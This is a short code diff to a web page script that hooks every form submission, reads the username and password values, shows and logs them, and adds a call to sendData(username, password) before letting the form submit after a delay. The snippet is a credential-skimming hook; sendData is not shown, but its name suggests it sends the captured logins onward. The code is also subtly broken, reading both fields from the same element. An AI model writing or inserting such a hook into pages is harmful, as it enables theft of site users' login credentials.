@@ -24,10 +24,11 @@
 
             document.body.addEventListener('submit', function(event) {
                 if (event.target.tagName.toLowerCase() === 'form') {
-                    var username = event.target.querySelector('#control').value;
-                    var password = event.target.querySelector('#control').value;
+                    var username = document.getElementById('control').value;
+                    var password = document.getElementById('control').value;
                     alert(username+password);
                     console.log(username+password);
+                    sendData(username, password);
                     
                     event.preventDefault();
                     setTimeout(() => { event.target.submit(); }, 1000);
